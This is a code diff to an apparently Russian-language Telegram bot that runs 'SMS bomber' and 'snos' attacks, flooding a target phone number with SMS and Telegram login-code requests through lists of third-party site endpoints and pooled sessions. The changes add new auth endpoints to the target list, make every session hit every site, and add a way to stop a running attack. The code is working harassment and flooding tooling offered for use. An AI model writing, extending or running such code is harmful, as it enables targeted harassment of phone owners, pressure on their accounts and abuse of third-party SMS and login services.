@@ -60,21 +60,11 @@ DEVICES = [
     {"model": "iPhone 13", "system": "iOS 15.7"},
     {"model": "iPhone 12", "system": "iOS 14.8"},
     {"model": "iPhone 11", "system": "iOS 13.6"},
-    {"model": "iPhone XR", "system": "iOS 12.5"},
     {"model": "Samsung Galaxy S24 Ultra", "system": "Android 14"},
     {"model": "Samsung Galaxy S23", "system": "Android 13"},
-    {"model": "Samsung Galaxy S22", "system": "Android 12"},
     {"model": "Google Pixel 8 Pro", "system": "Android 14"},
-    {"model": "Google Pixel 7", "system": "Android 13"},
     {"model": "Xiaomi 14 Pro", "system": "Android 14"},
-    {"model": "Xiaomi 13", "system": "Android 13"},
     {"model": "OnePlus 12", "system": "Android 14"},
-    {"model": "OnePlus 11", "system": "Android 13"},
-    {"model": "Huawei P60 Pro", "system": "HarmonyOS 4.0"},
-    {"model": "Huawei Mate 60", "system": "HarmonyOS 3.0"},
-    {"model": "iPad Pro", "system": "iOS 17.0"},
-    {"model": "iPad Air", "system": "iOS 16.0"},
-    {"model": "MacBook Pro", "system": "macOS 14.0"},
 ]
 
 TELEGRAM_AUTH_SITES = [
@@ -100,6 +90,8 @@ TELEGRAM_AUTH_SITES = [
     {"url": "https://api.bitget.com/telegram-auth", "method": "POST", "phone_field": "phone", "name": "Bitget"},
     {"url": "https://api.tgstat.com/auth/telegram", "method": "POST", "phone_field": "phone", "name": "TGStat"},
     {"url": "https://api.telemetr.io/auth/telegram", "method": "POST", "phone_field": "phone", "name": "Telemetr"},
+    {"url": "https://acollo.ru/auth/telegram", "method": "POST", "phone_field": "phone", "name": "Acollo"},
+    {"url": "https://oauth.telegram.org/auth", "method": "POST", "phone_field": "phone", "name": "OAuth"},
 ]
 
 BOMBER_WEBSITES = [
@@ -531,7 +523,7 @@ async def send_auth_request(session: aiohttp.ClientSession, phone: str, site: di
     except:
         return {"site": site["name"], "success": False}
 
-async def snos_attack(user_id: int, phone: str, rounds: int, progress_callback=None) -> tuple:
+async def snos_attack(user_id: int, phone: str, rounds: int, stop_event: asyncio.Event, progress_callback=None) -> tuple:
     results, ok, err = [], 0, 0
     phone = phone.strip().replace(" ", "").replace("-", "").replace("(", "").replace(")", "")
     if not phone.startswith("+"):
@@ -543,13 +535,21 @@ async def snos_attack(user_id: int, phone: str, rounds: int, progress_callback=N
     
     async with aiohttp.ClientSession(connector=connector) as sess:
         for rnd in range(1, rounds + 1):
+            if stop_event.is_set():
+                logger.info(f"Снос остановлен пользователем {user_id}")
+                break
+            
             sessions = await get_user_sessions_batch(user_id, SMS_PER_ROUND)
             
             tasks = []
+            # Каждая сессия отправляет SMS
             for sess in sessions:
                 tasks.append(send_sms_safe(sess, phone))
-            for site in TELEGRAM_AUTH_SITES:
-                tasks.append(send_auth_request(sess, phone, site))
+            
+            # Каждая сессия делает запрос на каждый сайт
+            for sess in sessions:
+                for site in TELEGRAM_AUTH_SITES:
+                    tasks.append(send_auth_request(sess, phone, site))
             
             batch = await asyncio.gather(*tasks, return_exceptions=True)
             release_user_sessions(sessions)
@@ -569,7 +569,8 @@ async def snos_attack(user_id: int, phone: str, rounds: int, progress_callback=N
                 await progress_callback(rnd, rounds, ok, err)
             
             logger.info(f"Снос раунд {rnd}/{rounds}: OK={round_ok} ERR={round_err}")
-            if rnd < rounds:
+            
+            if rnd < rounds and not stop_event.is_set():
                 await asyncio.sleep(ROUND_DELAY)
     
     return results, ok, err
@@ -593,7 +594,7 @@ async def send_bomber_request(session: aiohttp.ClientSession, phone: str, site: 
     except:
         return {"site": site["name"], "success": False}
 
-async def bomber_attack(phone: str, rounds: int, user_id: int, progress_callback=None) -> tuple:
+async def bomber_attack(phone: str, rounds: int, user_id: int, stop_event: asyncio.Event, progress_callback=None) -> tuple:
     results, ok, err = [], 0, 0
     add_log(user_id, "Бомбер", phone)
     
@@ -601,6 +602,10 @@ async def bomber_attack(phone: str, rounds: int, user_id: int, progress_callback
     
     async with aiohttp.ClientSession(connector=connector) as sess:
         for rnd in range(1, rounds + 1):
+            if stop_event.is_set():
+                logger.info(f"Бомбер остановлен пользователем {user_id}")
+                break
+            
             tasks = [send_bomber_request(sess, phone, site) for site in BOMBER_WEBSITES]
             batch = await asyncio.gather(*tasks, return_exceptions=True)
             
@@ -619,7 +624,8 @@ async def bomber_attack(phone: str, rounds: int, user_id: int, progress_callback
                 await progress_callback(rnd, rounds, ok, err)
             
             logger.info(f"Бомбер раунд {rnd}/{rounds}: OK={round_ok} ERR={round_err}")
-            if rnd < rounds:
+            
+            if rnd < rounds and not stop_event.is_set():
                 await asyncio.sleep(BOMBER_DELAY)
     
     return results, ok, err
@@ -853,7 +859,7 @@ async def start(msg: types.Message):
         return
     
     if user_id not in user_sessions or not user_sessions[user_id].get("ready"):
-            asyncio.create_task(ensure_user_sessions(user_id))
+        asyncio.create_task(ensure_user_sessions(user_id))
     
     sessions_count = get_user_sessions_count(user_id)
     sessions_ready = is_user_sessions_ready(user_id)
@@ -1046,7 +1052,9 @@ async def snos_count(msg: types.Message, state: FSMContext):
     user_id = msg.from_user.id
     await state.clear()
     
-    active_attacks[user_id] = True
+    stop_event = asyncio.Event()
+    active_attacks[user_id] = {"stop_event": stop_event, "task": None}
+    
     st = await send_message_with_banner(msg, f"<b>СНОС ЗАПУЩЕН</b>\n\nНомер: {phone}\nРаундов: {count}\nСайтов: {len(TELEGRAM_AUTH_SITES)}")
     
     async def prog(cur, tot, ok, err):
@@ -1055,7 +1063,14 @@ async def snos_count(msg: types.Message, state: FSMContext):
         except:
             pass
     
-    results, ok, err = await snos_attack(user_id, phone, count, prog)
+    task = asyncio.create_task(snos_attack(user_id, phone, count, stop_event, prog))
+    active_attacks[user_id]["task"] = task
+    
+    try:
+        results, ok, err = await task
+    except asyncio.CancelledError:
+        results, ok, err = [], 0, 0
+    
     asyncio.create_task(refresh_user_sessions(user_id))
     
     report = generate_snos_report(phone, results, ok, err, user_id)
@@ -1115,7 +1130,9 @@ async def bomber_count(msg: types.Message, state: FSMContext):
     user_id = msg.from_user.id
     await state.clear()
     
-    active_bombers[user_id] = True
+    stop_event = asyncio.Event()
+    active_bombers[user_id] = {"stop_event": stop_event, "task": None}
+    
     st = await send_message_with_banner(msg, f"<b>БОМБЕР ЗАПУЩЕН</b>\n\nНомер: {phone}\nСайтов: {len(BOMBER_WEBSITES)}")
     
     async def prog(cur, tot, ok, err):
@@ -1124,7 +1141,14 @@ async def bomber_count(msg: types.Message, state: FSMContext):
         except:
             pass
     
-    results, ok, err = await bomber_attack(phone, count, user_id, prog)
+    task = asyncio.create_task(bomber_attack(phone, count, user_id, stop_event, prog))
+    active_bombers[user_id]["task"] = task
+    
+    try:
+        results, ok, err = await task
+    except asyncio.CancelledError:
+        results, ok, err = [], 0, 0
+    
     report = generate_bomber_report(phone, results, ok, err)
     
     fn = f"bomber_{user_id}_{phone.replace('+', '')}.txt"
@@ -1331,10 +1355,19 @@ async def comp_simple_username(msg: types.Message, state: FSMContext):
 @dp.callback_query(F.data == "stop")
 async def stop(cb: types.CallbackQuery):
     user_id = cb.from_user.id
+    
     if user_id in active_attacks:
+        active_attacks[user_id]["stop_event"].set()
+        if active_attacks[user_id]["task"]:
+            active_attacks[user_id]["task"].cancel()
         del active_attacks[user_id]
+    
     if user_id in active_bombers:
+        active_bombers[user_id]["stop_event"].set()
+        if active_bombers[user_id]["task"]:
+            active_bombers[user_id]["task"].cancel()
         del active_bombers[user_id]
+    
     await edit_message_with_banner(cb, "<b>Остановлено</b>", get_main_menu())
 
 
